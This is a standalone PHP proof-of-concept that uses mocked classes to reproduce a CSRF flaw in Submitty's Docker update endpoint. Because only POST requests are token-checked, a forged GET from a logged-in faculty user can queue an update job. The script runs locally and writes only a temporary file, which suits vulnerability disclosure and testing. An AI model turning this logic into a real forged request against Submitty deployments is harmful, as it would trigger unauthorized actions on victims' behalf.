<?php
/**
 * Standalone PoC for Submitty DockerInterfaceController::updateDockerCall.
 *
 * This reproduces a source-level state-changing GET endpoint reachable by an
 * authenticated faculty victim. Because Submitty's global csrfCheck() only
 * validates POST requests, a top-level cross-site GET can queue the Docker
 * update job without a csrf_token.
 *
 * Run:
 *   php PoC.php
 */

class MockUser {
    public function accessFaculty(): bool { return true; }
}

class MockConfig {
    private string $submitty_path;
    public function __construct(string $path) { $this->submitty_path = $path; }
    public function getSubmittyPath(): string { return $this->submitty_path; }
}

class MockCore {
    private MockUser $user;
    private MockConfig $config;
    public function __construct(string $root) {
        $this->user = new MockUser();
        $this->config = new MockConfig($root);
    }
    public function getUser(): MockUser { return $this->user; }
    public function getConfig(): MockConfig { return $this->config; }
    public function getDateTimeNow(): DateTime { return new DateTime('2026-06-29 12:00:00'); }
}

function joinPaths(string ...$parts): string {
    return preg_replace('#/+#', '/', implode('/', $parts));
}

function writeJsonFile(string $path, array $data): bool {
    $dir = dirname($path);
    if (!is_dir($dir)) {
        mkdir($dir, 0777, true);
    }
    return file_put_contents($path, json_encode($data, JSON_PRETTY_PRINT)) !== false;
}

function vulnerable_updateDocker(MockCore $core): bool {
    // Mirrors site/app/controllers/DockerInterfaceController.php:183-195.
    $now = $core->getDateTimeNow()->format('Ymd');
    $docker_job_file = joinPaths($core->getConfig()->getSubmittyPath(), 'daemon_job_queue/docker' . $now . '.json');
    $docker_data = ['job' => 'UpdateDockerImages'];
    return writeJsonFile($docker_job_file, $docker_data);
}

function vulnerable_updateDockerCall(MockCore $core): array {
    // Mirrors site/app/controllers/DockerInterfaceController.php:171-180.
    $user = $core->getUser();
    if (is_null($user) || !$user->accessFaculty()) {
        return ['success' => false, 'message' => "You don't have access to this endpoint."];
    }
    if (!vulnerable_updateDocker($core)) {
        return ['success' => false, 'message' => 'Failed to write to file'];
    }
    return ['success' => true, 'message' => 'Successfully queued the system to update docker.'];
}

$root = sys_get_temp_dir() . '/submitty_poc_' . getmypid();
$core = new MockCore($root);

// Simulate a cross-site top-level GET issued by an attacker while a faculty user is logged in.
$_SERVER['REQUEST_METHOD'] = 'GET';
$_GET = [];
$_POST = [];

$response = vulnerable_updateDockerCall($core);
$job_file = joinPaths($root, 'daemon_job_queue/docker20260629.json');

print "Submitty updateDockerCall GET CSRF PoC\n";
print "request_method=" . $_SERVER['REQUEST_METHOD'] . "\n";
print "csrf_token_present=" . (isset($_GET['csrf_token']) || isset($_POST['csrf_token']) ? 'yes' : 'no') . "\n";
print "faculty_session_present=yes\n";
print "job_file={$job_file}\n";
print "job_file_exists=" . (file_exists($job_file) ? 'yes' : 'no') . "\n";
print "response=" . json_encode($response) . "\n";

if ($response['success'] === true && file_exists($job_file)) {
    print "job_file_contents=" . file_get_contents($job_file) . "\n";
    print "[VULNERABLE] Authenticated GET queued a Docker update job without a CSRF token.\n";
    exit(0);
}

print "[NOT VULNERABLE] State did not change.\n";
exit(1);
